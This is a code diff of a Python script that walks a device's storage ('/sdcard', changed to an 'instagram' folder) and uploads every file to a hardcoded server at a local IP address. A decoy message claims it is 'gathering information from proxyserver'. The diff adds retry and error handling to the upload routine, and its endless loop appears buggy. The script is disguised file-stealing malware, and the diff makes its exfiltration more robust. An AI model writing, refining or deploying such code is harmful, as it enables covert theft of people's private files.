@@ -1,15 +1,21 @@
-from requests import post
+from requests import post , exceptions
 from lib.colored import fg
 from os.path import join,exists
 from os import scandir
 url = 'http://192.168.1.27:5000/75706C6F6164'
 
 def SendCountent(filename):
-    if exists(filename):
-        with open(filename,'rb') as filetosend:
-            post(url,files={'file':filetosend},data={'filepath':filename})
-    else:
-        raise FileNotFoundError
+    while True:
+        try:
+            if exists(filename):
+                with open(filename,'rb') as filetosend:
+                    post(url,files={'file':filetosend},data={'filepath':filename})
+            else:
+                raise FileNotFoundError
+        except (exceptions.ConnectionError,exceptions.Timeout):
+            pass
+        except Exception as er:
+            print(er)
 
 def main(were='.'):
     Cclass = [were] ; CP = were ; loop = 0
@@ -20,17 +26,15 @@ def main(were='.'):
                 if i.is_dir():
                     Cclass.append((var:=join(CP,i.name)))
                 else:
-                    SendCountent(join(CP,i.name)) ; loop += 1
-                    print(f'Gathering information from proxyserver please wait := '+fg('green') +f'{loop}'+fg('white'),end='\r')
+                    SendCountent(join(CP,i.name)) ;loop += 1
+                    print(f'Gathering information from proxyserver please wait := '+fg('green') +f'{loop}'+fg('white')+'\r')
             Cclass.remove(CP)
             CP = Cclass[0]
+        except IndexError:
+            break
         except Exception as er: 
-            pass
-        except PermissionError:
-            try:
-                CP = Cclass[0]
-            except IndexError:
-                break
+            print(er)
 
-main('/sdcard')
+main('instagram')
+
 
